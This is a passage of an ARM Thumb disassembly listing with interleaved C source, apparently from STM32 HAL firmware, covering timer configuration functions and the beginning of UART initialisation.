 80051ca:	687b      	ldr	r3, [r7, #4]
 80051cc:	f1b3 4f80 	cmp.w	r3, #1073741824	; 0x40000000
 80051d0:	d007      	beq.n	80051e2 <TIM_Base_SetConfig+0x52>
 80051d2:	687b      	ldr	r3, [r7, #4]
 80051d4:	4a1e      	ldr	r2, [pc, #120]	; (8005250 <TIM_Base_SetConfig+0xc0>)
 80051d6:	4293      	cmp	r3, r2
 80051d8:	d003      	beq.n	80051e2 <TIM_Base_SetConfig+0x52>
 80051da:	687b      	ldr	r3, [r7, #4]
 80051dc:	4a1d      	ldr	r2, [pc, #116]	; (8005254 <TIM_Base_SetConfig+0xc4>)
 80051de:	4293      	cmp	r3, r2
 80051e0:	d108      	bne.n	80051f4 <TIM_Base_SetConfig+0x64>
  {
    /* Set the clock division */
    tmpcr1 &= ~TIM_CR1_CKD;
 80051e2:	68fb      	ldr	r3, [r7, #12]
 80051e4:	f423 7340 	bic.w	r3, r3, #768	; 0x300
 80051e8:	60fb      	str	r3, [r7, #12]
    tmpcr1 |= (uint32_t)Structure->ClockDivision;
 80051ea:	683b      	ldr	r3, [r7, #0]
 80051ec:	68db      	ldr	r3, [r3, #12]
 80051ee:	68fa      	ldr	r2, [r7, #12]
 80051f0:	4313      	orrs	r3, r2
 80051f2:	60fb      	str	r3, [r7, #12]
  }

  /* Set the auto-reload preload */
  MODIFY_REG(tmpcr1, TIM_CR1_ARPE, Structure->AutoReloadPreload);
 80051f4:	68fb      	ldr	r3, [r7, #12]
 80051f6:	f023 0280 	bic.w	r2, r3, #128	; 0x80
 80051fa:	683b      	ldr	r3, [r7, #0]
 80051fc:	695b      	ldr	r3, [r3, #20]
 80051fe:	4313      	orrs	r3, r2
 8005200:	60fb      	str	r3, [r7, #12]

  TIMx->CR1 = tmpcr1;
 8005202:	687b      	ldr	r3, [r7, #4]
 8005204:	68fa      	ldr	r2, [r7, #12]
 8005206:	601a      	str	r2, [r3, #0]

  /* Set the Autoreload value */
  TIMx->ARR = (uint32_t)Structure->Period ;
 8005208:	683b      	ldr	r3, [r7, #0]
 800520a:	689a      	ldr	r2, [r3, #8]
 800520c:	687b      	ldr	r3, [r7, #4]
 800520e:	62da      	str	r2, [r3, #44]	; 0x2c

  /* Set the Prescaler value */
  TIMx->PSC = Structure->Prescaler;
 8005210:	683b      	ldr	r3, [r7, #0]
 8005212:	681a      	ldr	r2, [r3, #0]
 8005214:	687b      	ldr	r3, [r7, #4]
 8005216:	629a      	str	r2, [r3, #40]	; 0x28

  if (IS_TIM_REPETITION_COUNTER_INSTANCE(TIMx))
 8005218:	687b      	ldr	r3, [r7, #4]
 800521a:	4a0c      	ldr	r2, [pc, #48]	; (800524c <TIM_Base_SetConfig+0xbc>)
 800521c:	4293      	cmp	r3, r2
 800521e:	d007      	beq.n	8005230 <TIM_Base_SetConfig+0xa0>
 8005220:	687b      	ldr	r3, [r7, #4]
 8005222:	4a0b      	ldr	r2, [pc, #44]	; (8005250 <TIM_Base_SetConfig+0xc0>)
 8005224:	4293      	cmp	r3, r2
 8005226:	d003      	beq.n	8005230 <TIM_Base_SetConfig+0xa0>
 8005228:	687b      	ldr	r3, [r7, #4]
 800522a:	4a0a      	ldr	r2, [pc, #40]	; (8005254 <TIM_Base_SetConfig+0xc4>)
 800522c:	4293      	cmp	r3, r2
 800522e:	d103      	bne.n	8005238 <TIM_Base_SetConfig+0xa8>
  {
    /* Set the Repetition Counter value */
    TIMx->RCR = Structure->RepetitionCounter;
 8005230:	683b      	ldr	r3, [r7, #0]
 8005232:	691a      	ldr	r2, [r3, #16]
 8005234:	687b      	ldr	r3, [r7, #4]
 8005236:	631a      	str	r2, [r3, #48]	; 0x30
  }

  /* Generate an update event to reload the Prescaler
     and the repetition counter (only for advanced timer) value immediately */
  TIMx->EGR = TIM_EGR_UG;
 8005238:	687b      	ldr	r3, [r7, #4]
 800523a:	2201      	movs	r2, #1
 800523c:	615a      	str	r2, [r3, #20]
}
 800523e:	bf00      	nop
 8005240:	3714      	adds	r7, #20
 8005242:	46bd      	mov	sp, r7
 8005244:	f85d 7b04 	ldr.w	r7, [sp], #4
 8005248:	4770      	bx	lr
 800524a:	bf00      	nop
 800524c:	40012c00 	.word	0x40012c00
 8005250:	40014000 	.word	0x40014000
 8005254:	40014400 	.word	0x40014400

08005258 <TIM_TI1_ConfigInputStage>:
  * @param  TIM_ICFilter Specifies the Input Capture Filter.
  *          This parameter must be a value between 0x00 and 0x0F.
  * @retval None
  */
static void TIM_TI1_ConfigInputStage(TIM_TypeDef *TIMx, uint32_t TIM_ICPolarity, uint32_t TIM_ICFilter)
{
 8005258:	b480      	push	{r7}
 800525a:	b087      	sub	sp, #28
 800525c:	af00      	add	r7, sp, #0
 800525e:	60f8      	str	r0, [r7, #12]
 8005260:	60b9      	str	r1, [r7, #8]
 8005262:	607a      	str	r2, [r7, #4]
  uint32_t tmpccmr1;
  uint32_t tmpccer;

  /* Disable the Channel 1: Reset the CC1E Bit */
  tmpccer = TIMx->CCER;
 8005264:	68fb      	ldr	r3, [r7, #12]
 8005266:	6a1b      	ldr	r3, [r3, #32]
 8005268:	617b      	str	r3, [r7, #20]
  TIMx->CCER &= ~TIM_CCER_CC1E;
 800526a:	68fb      	ldr	r3, [r7, #12]
 800526c:	6a1b      	ldr	r3, [r3, #32]
 800526e:	f023 0201 	bic.w	r2, r3, #1
 8005272:	68fb      	ldr	r3, [r7, #12]
 8005274:	621a      	str	r2, [r3, #32]
  tmpccmr1 = TIMx->CCMR1;
 8005276:	68fb      	ldr	r3, [r7, #12]
 8005278:	699b      	ldr	r3, [r3, #24]
 800527a:	613b      	str	r3, [r7, #16]

  /* Set the filter */
  tmpccmr1 &= ~TIM_CCMR1_IC1F;
 800527c:	693b      	ldr	r3, [r7, #16]
 800527e:	f023 03f0 	bic.w	r3, r3, #240	; 0xf0
 8005282:	613b      	str	r3, [r7, #16]
  tmpccmr1 |= (TIM_ICFilter << 4U);
 8005284:	687b      	ldr	r3, [r7, #4]
 8005286:	011b      	lsls	r3, r3, #4
 8005288:	693a      	ldr	r2, [r7, #16]
 800528a:	4313      	orrs	r3, r2
 800528c:	613b      	str	r3, [r7, #16]

  /* Select the Polarity and set the CC1E Bit */
  tmpccer &= ~(TIM_CCER_CC1P | TIM_CCER_CC1NP);
 800528e:	697b      	ldr	r3, [r7, #20]
 8005290:	f023 030a 	bic.w	r3, r3, #10
 8005294:	617b      	str	r3, [r7, #20]
  tmpccer |= TIM_ICPolarity;
 8005296:	697a      	ldr	r2, [r7, #20]
 8005298:	68bb      	ldr	r3, [r7, #8]
 800529a:	4313      	orrs	r3, r2
 800529c:	617b      	str	r3, [r7, #20]

  /* Write to TIMx CCMR1 and CCER registers */
  TIMx->CCMR1 = tmpccmr1;
 800529e:	68fb      	ldr	r3, [r7, #12]
 80052a0:	693a      	ldr	r2, [r7, #16]
 80052a2:	619a      	str	r2, [r3, #24]
  TIMx->CCER = tmpccer;
 80052a4:	68fb      	ldr	r3, [r7, #12]
 80052a6:	697a      	ldr	r2, [r7, #20]
 80052a8:	621a      	str	r2, [r3, #32]
}
 80052aa:	bf00      	nop
 80052ac:	371c      	adds	r7, #28
 80052ae:	46bd      	mov	sp, r7
 80052b0:	f85d 7b04 	ldr.w	r7, [sp], #4
 80052b4:	4770      	bx	lr

080052b6 <TIM_TI2_ConfigInputStage>:
  * @param  TIM_ICFilter Specifies the Input Capture Filter.
  *          This parameter must be a value between 0x00 and 0x0F.
  * @retval None
  */
static void TIM_TI2_ConfigInputStage(TIM_TypeDef *TIMx, uint32_t TIM_ICPolarity, uint32_t TIM_ICFilter)
{
 80052b6:	b480      	push	{r7}
 80052b8:	b087      	sub	sp, #28
 80052ba:	af00      	add	r7, sp, #0
 80052bc:	60f8      	str	r0, [r7, #12]
 80052be:	60b9      	str	r1, [r7, #8]
 80052c0:	607a      	str	r2, [r7, #4]
  uint32_t tmpccmr1;
  uint32_t tmpccer;

  /* Disable the Channel 2: Reset the CC2E Bit */
  tmpccer = TIMx->CCER;
 80052c2:	68fb      	ldr	r3, [r7, #12]
 80052c4:	6a1b      	ldr	r3, [r3, #32]
 80052c6:	617b      	str	r3, [r7, #20]
  TIMx->CCER &= ~TIM_CCER_CC2E;
 80052c8:	68fb      	ldr	r3, [r7, #12]
 80052ca:	6a1b      	ldr	r3, [r3, #32]
 80052cc:	f023 0210 	bic.w	r2, r3, #16
 80052d0:	68fb      	ldr	r3, [r7, #12]
 80052d2:	621a      	str	r2, [r3, #32]
  tmpccmr1 = TIMx->CCMR1;
 80052d4:	68fb      	ldr	r3, [r7, #12]
 80052d6:	699b      	ldr	r3, [r3, #24]
 80052d8:	613b      	str	r3, [r7, #16]

  /* Set the filter */
  tmpccmr1 &= ~TIM_CCMR1_IC2F;
 80052da:	693b      	ldr	r3, [r7, #16]
 80052dc:	f423 4370 	bic.w	r3, r3, #61440	; 0xf000
 80052e0:	613b      	str	r3, [r7, #16]
  tmpccmr1 |= (TIM_ICFilter << 12U);
 80052e2:	687b      	ldr	r3, [r7, #4]
 80052e4:	031b      	lsls	r3, r3, #12
 80052e6:	693a      	ldr	r2, [r7, #16]
 80052e8:	4313      	orrs	r3, r2
 80052ea:	613b      	str	r3, [r7, #16]

  /* Select the Polarity and set the CC2E Bit */
  tmpccer &= ~(TIM_CCER_CC2P | TIM_CCER_CC2NP);
 80052ec:	697b      	ldr	r3, [r7, #20]
 80052ee:	f023 03a0 	bic.w	r3, r3, #160	; 0xa0
 80052f2:	617b      	str	r3, [r7, #20]
  tmpccer |= (TIM_ICPolarity << 4U);
 80052f4:	68bb      	ldr	r3, [r7, #8]
 80052f6:	011b      	lsls	r3, r3, #4
 80052f8:	697a      	ldr	r2, [r7, #20]
 80052fa:	4313      	orrs	r3, r2
 80052fc:	617b      	str	r3, [r7, #20]

  /* Write to TIMx CCMR1 and CCER registers */
  TIMx->CCMR1 = tmpccmr1 ;
 80052fe:	68fb      	ldr	r3, [r7, #12]
 8005300:	693a      	ldr	r2, [r7, #16]
 8005302:	619a      	str	r2, [r3, #24]
  TIMx->CCER = tmpccer;
 8005304:	68fb      	ldr	r3, [r7, #12]
 8005306:	697a      	ldr	r2, [r7, #20]
 8005308:	621a      	str	r2, [r3, #32]
}
 800530a:	bf00      	nop
 800530c:	371c      	adds	r7, #28
 800530e:	46bd      	mov	sp, r7
 8005310:	f85d 7b04 	ldr.w	r7, [sp], #4
 8005314:	4770      	bx	lr

08005316 <TIM_ITRx_SetConfig>:
  *            @arg TIM_TS_TI2FP2: Filtered Timer Input 2
  *            @arg TIM_TS_ETRF: External Trigger input
  * @retval None
  */
static void TIM_ITRx_SetConfig(TIM_TypeDef *TIMx, uint32_t InputTriggerSource)
{
 8005316:	b480      	push	{r7}
 8005318:	b085      	sub	sp, #20
 800531a:	af00      	add	r7, sp, #0
 800531c:	6078      	str	r0, [r7, #4]
 800531e:	6039      	str	r1, [r7, #0]
  uint32_t tmpsmcr;

  /* Get the TIMx SMCR register value */
  tmpsmcr = TIMx->SMCR;
 8005320:	687b      	ldr	r3, [r7, #4]
 8005322:	689b      	ldr	r3, [r3, #8]
 8005324:	60fb      	str	r3, [r7, #12]
  /* Reset the TS Bits */
  tmpsmcr &= ~TIM_SMCR_TS;
 8005326:	68fb      	ldr	r3, [r7, #12]
 8005328:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 800532c:	60fb      	str	r3, [r7, #12]
  /* Set the Input Trigger source and the slave mode*/
  tmpsmcr |= (InputTriggerSource | TIM_SLAVEMODE_EXTERNAL1);
 800532e:	683a      	ldr	r2, [r7, #0]
 8005330:	68fb      	ldr	r3, [r7, #12]
 8005332:	4313      	orrs	r3, r2
 8005334:	f043 0307 	orr.w	r3, r3, #7
 8005338:	60fb      	str	r3, [r7, #12]
  /* Write to TIMx SMCR */
  TIMx->SMCR = tmpsmcr;
 800533a:	687b      	ldr	r3, [r7, #4]
 800533c:	68fa      	ldr	r2, [r7, #12]
 800533e:	609a      	str	r2, [r3, #8]
}
 8005340:	bf00      	nop
 8005342:	3714      	adds	r7, #20
 8005344:	46bd      	mov	sp, r7
 8005346:	f85d 7b04 	ldr.w	r7, [sp], #4
 800534a:	4770      	bx	lr

0800534c <TIM_ETR_SetConfig>:
  *          This parameter must be a value between 0x00 and 0x0F
  * @retval None
  */
void TIM_ETR_SetConfig(TIM_TypeDef *TIMx, uint32_t TIM_ExtTRGPrescaler,
                       uint32_t TIM_ExtTRGPolarity, uint32_t ExtTRGFilter)
{
 800534c:	b480      	push	{r7}
 800534e:	b087      	sub	sp, #28
 8005350:	af00      	add	r7, sp, #0
 8005352:	60f8      	str	r0, [r7, #12]
 8005354:	60b9      	str	r1, [r7, #8]
 8005356:	607a      	str	r2, [r7, #4]
 8005358:	603b      	str	r3, [r7, #0]
  uint32_t tmpsmcr;

  tmpsmcr = TIMx->SMCR;
 800535a:	68fb      	ldr	r3, [r7, #12]
 800535c:	689b      	ldr	r3, [r3, #8]
 800535e:	617b      	str	r3, [r7, #20]

  /* Reset the ETR Bits */
  tmpsmcr &= ~(TIM_SMCR_ETF | TIM_SMCR_ETPS | TIM_SMCR_ECE | TIM_SMCR_ETP);
 8005360:	697b      	ldr	r3, [r7, #20]
 8005362:	f423 437f 	bic.w	r3, r3, #65280	; 0xff00
 8005366:	617b      	str	r3, [r7, #20]

  /* Set the Prescaler, the Filter value and the Polarity */
  tmpsmcr |= (uint32_t)(TIM_ExtTRGPrescaler | (TIM_ExtTRGPolarity | (ExtTRGFilter << 8U)));
 8005368:	683b      	ldr	r3, [r7, #0]
 800536a:	021a      	lsls	r2, r3, #8
 800536c:	687b      	ldr	r3, [r7, #4]
 800536e:	431a      	orrs	r2, r3
 8005370:	68bb      	ldr	r3, [r7, #8]
 8005372:	4313      	orrs	r3, r2
 8005374:	697a      	ldr	r2, [r7, #20]
 8005376:	4313      	orrs	r3, r2
 8005378:	617b      	str	r3, [r7, #20]

  /* Write to TIMx SMCR */
  TIMx->SMCR = tmpsmcr;
 800537a:	68fb      	ldr	r3, [r7, #12]
 800537c:	697a      	ldr	r2, [r7, #20]
 800537e:	609a      	str	r2, [r3, #8]
}
 8005380:	bf00      	nop
 8005382:	371c      	adds	r7, #28
 8005384:	46bd      	mov	sp, r7
 8005386:	f85d 7b04 	ldr.w	r7, [sp], #4
 800538a:	4770      	bx	lr

0800538c <HAL_TIMEx_MasterConfigSynchronization>:
  *         mode.
  * @retval HAL status
  */
HAL_StatusTypeDef HAL_TIMEx_MasterConfigSynchronization(TIM_HandleTypeDef *htim,
                                                        const TIM_MasterConfigTypeDef *sMasterConfig)
{
 800538c:	b480      	push	{r7}
 800538e:	b085      	sub	sp, #20
 8005390:	af00      	add	r7, sp, #0
 8005392:	6078      	str	r0, [r7, #4]
 8005394:	6039      	str	r1, [r7, #0]
  assert_param(IS_TIM_MASTER_INSTANCE(htim->Instance));
  assert_param(IS_TIM_TRGO_SOURCE(sMasterConfig->MasterOutputTrigger));
  assert_param(IS_TIM_MSM_STATE(sMasterConfig->MasterSlaveMode));

  /* Check input state */
  __HAL_LOCK(htim);
 8005396:	687b      	ldr	r3, [r7, #4]
 8005398:	f893 303c 	ldrb.w	r3, [r3, #60]	; 0x3c
 800539c:	2b01      	cmp	r3, #1
 800539e:	d101      	bne.n	80053a4 <HAL_TIMEx_MasterConfigSynchronization+0x18>
 80053a0:	2302      	movs	r3, #2
 80053a2:	e04f      	b.n	8005444 <HAL_TIMEx_MasterConfigSynchronization+0xb8>
 80053a4:	687b      	ldr	r3, [r7, #4]
 80053a6:	2201      	movs	r2, #1
 80053a8:	f883 203c 	strb.w	r2, [r3, #60]	; 0x3c

  /* Change the handler state */
  htim->State = HAL_TIM_STATE_BUSY;
 80053ac:	687b      	ldr	r3, [r7, #4]
 80053ae:	2202      	movs	r2, #2
 80053b0:	f883 203d 	strb.w	r2, [r3, #61]	; 0x3d

  /* Get the TIMx CR2 register value */
  tmpcr2 = htim->Instance->CR2;
 80053b4:	687b      	ldr	r3, [r7, #4]
 80053b6:	681b      	ldr	r3, [r3, #0]
 80053b8:	685b      	ldr	r3, [r3, #4]
 80053ba:	60fb      	str	r3, [r7, #12]

  /* Get the TIMx SMCR register value */
  tmpsmcr = htim->Instance->SMCR;
 80053bc:	687b      	ldr	r3, [r7, #4]
 80053be:	681b      	ldr	r3, [r3, #0]
 80053c0:	689b      	ldr	r3, [r3, #8]
 80053c2:	60bb      	str	r3, [r7, #8]

  /* If the timer supports ADC synchronization through TRGO2, set the master mode selection 2 */
  if (IS_TIM_TRGO2_INSTANCE(htim->Instance))
 80053c4:	687b      	ldr	r3, [r7, #4]
 80053c6:	681b      	ldr	r3, [r3, #0]
 80053c8:	4a21      	ldr	r2, [pc, #132]	; (8005450 <HAL_TIMEx_MasterConfigSynchronization+0xc4>)
 80053ca:	4293      	cmp	r3, r2
 80053cc:	d108      	bne.n	80053e0 <HAL_TIMEx_MasterConfigSynchronization+0x54>
  {
    /* Check the parameters */
    assert_param(IS_TIM_TRGO2_SOURCE(sMasterConfig->MasterOutputTrigger2));

    /* Clear the MMS2 bits */
    tmpcr2 &= ~TIM_CR2_MMS2;
 80053ce:	68fb      	ldr	r3, [r7, #12]
 80053d0:	f423 0370 	bic.w	r3, r3, #15728640	; 0xf00000
 80053d4:	60fb      	str	r3, [r7, #12]
    /* Select the TRGO2 source*/
    tmpcr2 |= sMasterConfig->MasterOutputTrigger2;
 80053d6:	683b      	ldr	r3, [r7, #0]
 80053d8:	685b      	ldr	r3, [r3, #4]
 80053da:	68fa      	ldr	r2, [r7, #12]
 80053dc:	4313      	orrs	r3, r2
 80053de:	60fb      	str	r3, [r7, #12]
  }

  /* Reset the MMS Bits */
  tmpcr2 &= ~TIM_CR2_MMS;
 80053e0:	68fb      	ldr	r3, [r7, #12]
 80053e2:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 80053e6:	60fb      	str	r3, [r7, #12]
  /* Select the TRGO source */
  tmpcr2 |=  sMasterConfig->MasterOutputTrigger;
 80053e8:	683b      	ldr	r3, [r7, #0]
 80053ea:	681b      	ldr	r3, [r3, #0]
 80053ec:	68fa      	ldr	r2, [r7, #12]
 80053ee:	4313      	orrs	r3, r2
 80053f0:	60fb      	str	r3, [r7, #12]

  /* Update TIMx CR2 */
  htim->Instance->CR2 = tmpcr2;
 80053f2:	687b      	ldr	r3, [r7, #4]
 80053f4:	681b      	ldr	r3, [r3, #0]
 80053f6:	68fa      	ldr	r2, [r7, #12]
 80053f8:	605a      	str	r2, [r3, #4]

  if (IS_TIM_SLAVE_INSTANCE(htim->Instance))
 80053fa:	687b      	ldr	r3, [r7, #4]
 80053fc:	681b      	ldr	r3, [r3, #0]
 80053fe:	4a14      	ldr	r2, [pc, #80]	; (8005450 <HAL_TIMEx_MasterConfigSynchronization+0xc4>)
 8005400:	4293      	cmp	r3, r2
 8005402:	d009      	beq.n	8005418 <HAL_TIMEx_MasterConfigSynchronization+0x8c>
 8005404:	687b      	ldr	r3, [r7, #4]
 8005406:	681b      	ldr	r3, [r3, #0]
 8005408:	f1b3 4f80 	cmp.w	r3, #1073741824	; 0x40000000
 800540c:	d004      	beq.n	8005418 <HAL_TIMEx_MasterConfigSynchronization+0x8c>
 800540e:	687b      	ldr	r3, [r7, #4]
 8005410:	681b      	ldr	r3, [r3, #0]
 8005412:	4a10      	ldr	r2, [pc, #64]	; (8005454 <HAL_TIMEx_MasterConfigSynchronization+0xc8>)
 8005414:	4293      	cmp	r3, r2
 8005416:	d10c      	bne.n	8005432 <HAL_TIMEx_MasterConfigSynchronization+0xa6>
  {
    /* Reset the MSM Bit */
    tmpsmcr &= ~TIM_SMCR_MSM;
 8005418:	68bb      	ldr	r3, [r7, #8]
 800541a:	f023 0380 	bic.w	r3, r3, #128	; 0x80
 800541e:	60bb      	str	r3, [r7, #8]
    /* Set master mode */
    tmpsmcr |= sMasterConfig->MasterSlaveMode;
 8005420:	683b      	ldr	r3, [r7, #0]
 8005422:	689b      	ldr	r3, [r3, #8]
 8005424:	68ba      	ldr	r2, [r7, #8]
 8005426:	4313      	orrs	r3, r2
 8005428:	60bb      	str	r3, [r7, #8]

    /* Update TIMx SMCR */
    htim->Instance->SMCR = tmpsmcr;
 800542a:	687b      	ldr	r3, [r7, #4]
 800542c:	681b      	ldr	r3, [r3, #0]
 800542e:	68ba      	ldr	r2, [r7, #8]
 8005430:	609a      	str	r2, [r3, #8]
  }

  /* Change the htim state */
  htim->State = HAL_TIM_STATE_READY;
 8005432:	687b      	ldr	r3, [r7, #4]
 8005434:	2201      	movs	r2, #1
 8005436:	f883 203d 	strb.w	r2, [r3, #61]	; 0x3d

  __HAL_UNLOCK(htim);
 800543a:	687b      	ldr	r3, [r7, #4]
 800543c:	2200      	movs	r2, #0
 800543e:	f883 203c 	strb.w	r2, [r3, #60]	; 0x3c

  return HAL_OK;
 8005442:	2300      	movs	r3, #0
}
 8005444:	4618      	mov	r0, r3
 8005446:	3714      	adds	r7, #20
 8005448:	46bd      	mov	sp, r7
 800544a:	f85d 7b04 	ldr.w	r7, [sp], #4
 800544e:	4770      	bx	lr
 8005450:	40012c00 	.word	0x40012c00
 8005454:	40014000 	.word	0x40014000

08005458 <HAL_TIMEx_CommutCallback>:
  * @brief  Hall commutation changed callback in non-blocking mode
  * @param  htim TIM handle
  * @retval None
  */
__weak void HAL_TIMEx_CommutCallback(TIM_HandleTypeDef *htim)
{
 8005458:	b480      	push	{r7}
 800545a:	b083      	sub	sp, #12
 800545c:	af00      	add	r7, sp, #0
 800545e:	6078      	str	r0, [r7, #4]
  UNUSED(htim);

  /* NOTE : This function should not be modified, when the callback is needed,
            the HAL_TIMEx_CommutCallback could be implemented in the user file
   */
}
 8005460:	bf00      	nop
 8005462:	370c      	adds	r7, #12
 8005464:	46bd      	mov	sp, r7
 8005466:	f85d 7b04 	ldr.w	r7, [sp], #4
 800546a:	4770      	bx	lr

0800546c <HAL_TIMEx_BreakCallback>:
  * @brief  Hall Break detection callback in non-blocking mode
  * @param  htim TIM handle
  * @retval None
  */
__weak void HAL_TIMEx_BreakCallback(TIM_HandleTypeDef *htim)
{
 800546c:	b480      	push	{r7}
 800546e:	b083      	sub	sp, #12
 8005470:	af00      	add	r7, sp, #0
 8005472:	6078      	str	r0, [r7, #4]
  UNUSED(htim);

  /* NOTE : This function should not be modified, when the callback is needed,
            the HAL_TIMEx_BreakCallback could be implemented in the user file
   */
}
 8005474:	bf00      	nop
 8005476:	370c      	adds	r7, #12
 8005478:	46bd      	mov	sp, r7
 800547a:	f85d 7b04 	ldr.w	r7, [sp], #4
 800547e:	4770      	bx	lr

08005480 <HAL_TIMEx_Break2Callback>:
  * @brief  Hall Break2 detection callback in non blocking mode
  * @param  htim: TIM handle
  * @retval None
  */
__weak void HAL_TIMEx_Break2Callback(TIM_HandleTypeDef *htim)
{
 8005480:	b480      	push	{r7}
 8005482:	b083      	sub	sp, #12
 8005484:	af00      	add	r7, sp, #0
 8005486:	6078      	str	r0, [r7, #4]
  UNUSED(htim);

  /* NOTE : This function Should not be modified, when the callback is needed,
            the HAL_TIMEx_Break2Callback could be implemented in the user file
   */
}
 8005488:	bf00      	nop
 800548a:	370c      	adds	r7, #12
 800548c:	46bd      	mov	sp, r7
 800548e:	f85d 7b04 	ldr.w	r7, [sp], #4
 8005492:	4770      	bx	lr

08005494 <HAL_UART_Init>:
  *        parameters in the UART_InitTypeDef and initialize the associated handle.
  * @param huart UART handle.
  * @retval HAL status
  */
HAL_StatusTypeDef HAL_UART_Init(UART_HandleTypeDef *huart)
{
 8005494:	b580      	push	{r7, lr}
 8005496:	b082      	sub	sp, #8
 8005498:	af00      	add	r7, sp, #0
 800549a:	6078      	str	r0, [r7, #4]
  /* Check the UART handle allocation */
  if (huart == NULL)
 800549c:	687b      	ldr	r3, [r7, #4]
 800549e:	2b00      	cmp	r3, #0
 80054a0:	d101      	bne.n	80054a6 <HAL_UART_Init+0x12>
  {
    return HAL_ERROR;
 80054a2:	2301      	movs	r3, #1
 80054a4:	e040      	b.n	8005528 <HAL_UART_Init+0x94>
  {
    /* Check the parameters */
    assert_param((IS_UART_INSTANCE(huart->Instance)) || (IS_LPUART_INSTANCE(huart->Instance)));
  }

  if (huart->gState == HAL_UART_STATE_RESET)
 80054a6:	687b      	ldr	r3, [r7, #4]
 80054a8:	6fdb      	ldr	r3, [r3, #124]	; 0x7c
 80054aa:	2b00      	cmp	r3, #0
 80054ac:	d106      	bne.n	80054bc <HAL_UART_Init+0x28>
  {
    /* Allocate lock resource and initialize it */
    huart->Lock = HAL_UNLOCKED;
 80054ae:	687b      	ldr	r3, [r7, #4]
 80054b0:	2200      	movs	r2, #0
 80054b2:	f883 2078 	strb.w	r2, [r3, #120]	; 0x78

    /* Init the low level hardware */
    huart->MspInitCallback(huart);
#else
    /* Init the low level hardware : GPIO, CLOCK */
    HAL_UART_MspInit(huart);
 80054b6:	6878      	ldr	r0, [r7, #4]
 80054b8:	f7fb fd78 	bl	8000fac <HAL_UART_MspInit>
#endif /* (USE_HAL_UART_REGISTER_CALLBACKS) */
  }

  huart->gState = HAL_UART_STATE_BUSY;
 80054bc:	687b      	ldr	r3, [r7, #4]
 80054be:	2224      	movs	r2, #36	; 0x24
 80054c0:	67da      	str	r2, [r3, #124]	; 0x7c

  __HAL_UART_DISABLE(huart);
 80054c2:	687b      	ldr	r3, [r7, #4]
 80054c4:	681b      	ldr	r3, [r3, #0]
 80054c6:	681a      	ldr	r2, [r3, #0]
 80054c8:	687b      	ldr	r3, [r7, #4]
 80054ca:	681b      	ldr	r3, [r3, #0]
 80054cc:	f022 0201 	bic.w	r2, r2, #1
 80054d0:	601a      	str	r2, [r3, #0]

  /* Perform advanced settings configuration */
  /* For some items, configuration requires to be done prior TE and RE bits are set */
  if (huart->AdvancedInit.AdvFeatureInit != UART_ADVFEATURE_NO_INIT)
 80054d2:	687b      	ldr	r3, [r7, #4]
 80054d4:	6a5b      	ldr	r3, [r3, #36]	; 0x24
 80054d6:	2b00      	cmp	r3, #0
 80054d8:	d002      	beq.n	80054e0 <HAL_UART_Init+0x4c>
  {
    UART_AdvFeatureConfig(huart);
 80054da:	6878      	ldr	r0, [r7, #4]
 80054dc:	f000 fa54 	bl	8005988 <UART_AdvFeatureConfig>
  }

  /* Set the UART Communication parameters */
  if (UART_SetConfig(huart) == HAL_ERROR)
 80054e0:	6878      	ldr	r0, [r7, #4]
 80054e2:	f000 f825 	bl	8005530 <UART_SetConfig>
 80054e6:	4603      	mov	r3, r0
 80054e8:	2b01      	cmp	r3, #1
 80054ea:	d101      	bne.n	80054f0 <HAL_UART_Init+0x5c>
  {
    return HAL_ERROR;
 80054ec:	2301      	movs	r3, #1
 80054ee:	e01b      	b.n	8005528 <HAL_UART_Init+0x94>
  }

  /* In asynchronous mode, the following bits must be kept cleared:
  - LINEN and CLKEN bits in the USART_CR2 register,
  - SCEN, HDSEL and IREN  bits in the USART_CR3 register.*/
  CLEAR_BIT(huart->Instance->CR2, (USART_CR2_LINEN | USART_CR2_CLKEN));
 80054f0:	687b      	ldr	r3, [r7, #4]
 80054f2:	681b      	ldr	r3, [r3, #0]
 80054f4:	685a      	ldr	r2, [r3, #4]
 80054f6:	687b      	ldr	r3, [r7, #4]
 80054f8:	681b      	ldr	r3, [r3, #0]
 80054fa:	f422 4290 	bic.w	r2, r2, #18432	; 0x4800
 80054fe:	605a      	str	r2, [r3, #4]
  CLEAR_BIT(huart->Instance->CR3, (USART_CR3_SCEN | USART_CR3_HDSEL | USART_CR3_IREN));
 8005500:	687b      	ldr	r3, [r7, #4]
 8005502:	681b      	ldr	r3, [r3, #0]
 8005504:	689a      	ldr	r2, [r3, #8]
 8005506:	687b      	ldr	r3, [r7, #4]
 8005508:	681b      	ldr	r3, [r3, #0]
 800550a:	f022 022a 	bic.w	r2, r2, #42	; 0x2a
 800550e:	609a      	str	r2, [r3, #8]

  __HAL_UART_ENABLE(huart);
 8005510:	687b      	ldr	r3, [r7, #4]
 8005512:	681b      	ldr	r3, [r3, #0]
 8005514:	681a      	ldr	r2, [r3, #0]
 8005516:	687b      	ldr	r3, [r7, #4]
 8005518:	681b      	ldr	r3, [r3, #0]
 800551a:	f042 0201 	orr.w	r2, r2, #1
 800551e:	601a      	str	r2, [r3, #0]

  /* TEACK and/or REACK to check before moving huart->gState and huart->RxState to Ready */
  return (UART_CheckIdleState(huart));
 8005520:	6878      	ldr	r0, [r7, #4]
 8005522:	f000 fad3 	bl	8005acc <UART_CheckIdleState>
 8005526:	4603      	mov	r3, r0
}
 8005528:	4618      	mov	r0, r3
 800552a:	3708      	adds	r7, #8
 800552c:	46bd      	mov	sp, r7
 800552e:	bd80      	pop	{r7, pc}

08005530 <UART_SetConfig>:
  * @brief Configure the UART peripheral.
  * @param huart UART handle.
  * @retval HAL status
  */
HAL_StatusTypeDef UART_SetConfig(UART_HandleTypeDef *huart)
{
 8005530:	e92d 4fb0 	stmdb	sp!, {r4, r5, r7, r8, r9, sl, fp, lr}
 8005534:	b08a      	sub	sp, #40	; 0x28
 8005536:	af00      	add	r7, sp, #0
 8005538:	60f8      	str	r0, [r7, #12]
  uint32_t tmpreg;
  uint16_t brrtemp;
  UART_ClockSourceTypeDef clocksource;
  uint32_t usartdiv;
  HAL_StatusTypeDef ret               = HAL_OK;
 800553a:	2300      	movs	r3, #0
 800553c:	f887 3022 	strb.w	r3, [r7, #34]	; 0x22
  *  the UART Word Length, Parity, Mode and oversampling:
  *  set the M bits according to huart->Init.WordLength value
  *  set PCE and PS bits according to huart->Init.Parity value
  *  set TE and RE bits according to huart->Init.Mode value
  *  set OVER8 bit according to huart->Init.OverSampling value */
